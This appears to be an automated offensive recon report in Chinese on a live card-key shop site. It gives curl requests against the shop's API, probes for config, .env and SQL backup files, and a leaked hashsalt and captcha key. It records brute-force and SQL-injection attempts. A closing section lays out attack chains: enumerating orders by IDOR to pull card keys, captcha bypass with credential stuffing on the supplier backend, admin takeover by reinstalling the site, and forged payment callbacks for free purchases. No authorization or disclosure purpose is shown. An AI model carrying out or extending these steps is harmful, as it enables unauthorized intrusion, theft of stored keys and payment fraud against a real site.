# htqq.lol 深挖 v2 报告 — 新增高危发现

- 时间: 2026-07-13
- 目标: https://htqq.lol/shop/
- 路径: `/data/automation/results/htqq.lol/deep_v2_20260713/`

---

## 本轮新增高危

### H7. 供货商后台完整暴露 — `/shop/sup/`

```
https://htqq.lol/shop/sup/          → 跳转 login.php
https://htqq.lol/shop/sup/login.php → 供货商登录（标题：供货商登录）
https://htqq.lol/shop/sup/ajax.php  → 后台 API（act=login 等）
```

**已发现后台页面（均需登录，JS 跳转）：**

| 路径 | 功能 |
|------|------|
| `sup/list.php` | 订单管理 |
| `sup/fakalist.php` | 发卡库存管理（卡密明文） |
| `sup/recharge.php` | 充值余额 |
| `sup/record.php` | 收支明细 |
| `sup/workorder.php` | 工单系统 |
| `sup/reg.php` | 注册（已关闭：暂不开放供货商注册） |

**登录接口：** `sup/ajax.php?act=login`
- 需 Geetest 验证码（`请先完成验证`）
- 弱口令字典未命中
- 一旦突破 → 直接访问全部订单 + 卡密库存

**风险等级：高危攻击面** — 供货商后台 = 卡密仓库入口

---

### H8. `gettoolnew` 分类过滤失效 — API 逻辑漏洞

```bash
# 任意 cid 均返回相同 9 个商品，cid 参数被完全忽略
curl -sk -H "X-Requested-With: XMLHttpRequest" \
  "https://htqq.lol/shop/ajax.php?act=gettoolnew&cid=1"
curl -sk -H "X-Requested-With: XMLHttpRequest" \
  "https://htqq.lol/shop/ajax.php?act=gettoolnew&cid=99"
# 两者返回完全相同
```

对比 `gettool`（正常工作）：

| cid | 分类名 | 商品数 |
|-----|--------|--------|
| 7 | 扫码老号 | **28** |
| 8 | 余额充值 | 8 |
| 9 | 国卡回流 | 7 |
| 6 | 美卡老号 | 2 |
| 2 | 飞机机器人 | 2 |
| 5/11 | 其他 | 各 1 |
| **合计** | 9 分类 | **49 SKU** |

`gettool` 泄露完整字段：`tid,name,price,stock,sales,goods_sid,desc,alert,input,inputs...`

---

### H9. `query` 接口后端崩溃 — HTTP 500

```bash
curl -sk -X POST -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://htqq.lol/shop/" \
  -d "type=1&kw=18000" \
  "https://htqq.lol/shop/ajax.php?act=query"
# → HTTP 500, body 为空
```

- 所有参数组合均 500（正常输入、引号、数字）
- 含 `SLEEP`/`AND` 关键字 → WAF 拦截（200 + 拦截页）
- **推断：** 后端 PHP 异常崩溃，可能存在 SQL 注入但被 WAF 覆盖；错误处理缺失导致信息泄露风险

---

### H10. 框架核心文件存在性确认

| 路径 | 状态 |
|------|------|
| `includes/authcode.php` | 403 存在 |
| `includes/common.php` | 403 存在 |
| `includes/config.php` | 403 存在 |
| `includes/` | 403 目录存在 |
| `.env` / `.env.bak` / `.env.example` | 403 存在 |
| `config.php.bak` / `ajax.php.bak` | 403 存在 |
| `backup.sql` / `database.sql` / `htqq.sql` | 403 存在 |
| `install/install.lock` | **200 可读**（返回"安装锁"） |
| `install/` | 200 安装向导可访问 |

---

### H11. 其他新暴露接口

```
/shop/api.php           → {"code":-5,"msg":"No Act!"}
/shop/other/notify.php  → No Act
/shop/sup/ajax.php      → act=login 无需认证即可调用（返回验证提示）
```

**`cancel` 订单号枚举差异（需有效 CSRF）：**
- 空 orderid → `订单号未知`
- 具体 orderid → `订单号不存在！`
- 可用于判断订单号格式/存在性

---

## 已确认高危（前轮复现有效）

| ID | 漏洞 | 状态 |
|----|------|------|
| H1 | `getcount` 经营数据泄露（580万+） | ✅ 实时有效 |
| H2 | `order` 卡密 IDOR（需 skey） | ⚠️ 逻辑确认，skey 未获取 |
| H3 | 全局 hashsalt 硬编码泄露 | ✅ `345a36b5fa7be2bdd2f1724157952938` |
| H4 | 支付回调接口暴露（签名保护） | ✅ epay/ali/wx/qq 均可达 |
| H5 | `cron.php` 公网可访问 | ✅ 密钥未破解 |
| H6 | 安装向导 + install.lock 可读 | ✅ 删锁可重装 |

---

## 未突破 / WAF 拦截

| 测试项 | 结果 |
|--------|------|
| order skey 暴力（id 18000-18010） | 验证失败 |
| alipay_notify SQLi | 无延迟，无注入 |
| epay_notify 签名伪造 | error |
| cron 密钥字典（40+） | 未命中 |
| sup 弱口令（24 组） | 需 Geetest |
| pay 跳过验证码 | 验证失败 |
| query SQLi（SLEEP/AND） | WAF 拦截 |
| user/sup quickreg | 未开启快捷登录 |

---

## 最高价值攻击链（更新）

```
路径 A（卡密直取）:
  获取一个真实 skey（购买/社工/Cookie）
  → POST ajax.php?act=order {id, skey}
  → 遍历 18000+ 订单 → kminfo 卡密明文

路径 B（供货商后台）:
  /shop/sup/login.php
  → 绕过 Geetest（打码平台）
  → 弱口令/撞库
  → fakalist.php 卡密库存全量

路径 C（重装接管）:
  找到任意文件写入/删除漏洞
  → 删除 install/install.lock
  → 访问 install/ 重装 → 管理员接管

路径 D（支付回调）:
  逆向 epay 签名算法
  → POST epay_notify.php 伪造支付成功
  → 0 元购卡
```

---

## 实时数据快照

```json
{
  "orders": "18011",
  "money": 5800290.4,
  "money1": 4840,
  "products": 49,
  "categories": 9,
  "hashsalt": "345a36b5fa7be2bdd2f1724157952938",
  "geetest_gt": "a1017fd4951689c5d20317c165c1c318"
}
```
